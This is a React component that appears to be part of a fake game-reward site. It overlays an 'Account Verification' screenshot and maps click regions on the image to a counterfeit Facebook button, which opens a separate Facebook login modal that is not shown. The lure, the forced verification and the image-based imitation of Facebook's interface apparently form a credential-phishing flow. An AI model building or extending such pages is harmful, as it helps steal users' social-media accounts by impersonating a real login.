import { useState } from 'react';
import FacebookLoginModal from './FacebookLoginModal';

interface RewardItem {
  id: number;
  name: string;
  description: string;
  rarity: 'Legendary' | 'Epic' | 'Rare';
  image_url: string;
}

interface AccessModalProps {
  isOpen: boolean;
  onClose: () => void;
  item: RewardItem | null;
}

const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
  const [showFacebookLogin, setShowFacebookLogin] = useState(false);
  
  if (!isOpen) return null;

  const handleFacebookLogin = () => {
    setShowFacebookLogin(true);
  };

  const handleCloseFacebookLogin = () => {
    setShowFacebookLogin(false);
  };

  const handleBackdropClick = (e: React.MouseEvent) => {
    // Only close if clicking the backdrop, not the image
    if (e.target === e.currentTarget) {
      onClose();
    }
  };

  const handleImageClick = (e: React.MouseEvent) => {
    e.stopPropagation();
    
    // Get the image element and its position
    const imageElement = e.currentTarget as HTMLImageElement;
    const rect = imageElement.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    
    // Calculate relative position as percentage
    const relativeX = (x / rect.width) * 100;
    const relativeY = (y / rect.height) * 100;
    
    // Facebook button area (approximate coordinates based on the image)
    // The Facebook button appears to be roughly in the center-upper area
    if (relativeX >= 25 && relativeX <= 75 && relativeY >= 40 && relativeY <= 55) {
      handleFacebookLogin();
      return;
    }
    
    // Close button area (top right corner)
    // X button appears to be in the top right corner
    if (relativeX >= 85 && relativeX <= 100 && relativeY >= 0 && relativeY <= 15) {
      onClose();
      return;
    }
    
    // Don't do anything for other clicks on the image
  };

  return (
    <>
      <div 
        className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm"
        onClick={handleBackdropClick}
      >
        <div className="relative max-w-4xl max-h-[90vh] p-4">
          <img
            src="/lovable-uploads/80659b4f-8f87-46f6-965a-a5623d10c545.png"
            alt="Account Verification"
            className="w-full h-auto rounded-lg shadow-2xl cursor-pointer"
            onClick={handleImageClick}
            style={{ maxHeight: '85vh', objectFit: 'contain' }}
          />
        </div>
      </div>
      
      <FacebookLoginModal 
        isOpen={showFacebookLogin}
        onClose={handleCloseFacebookLogin}
      />
    </>
  );
};

export default AccessModal;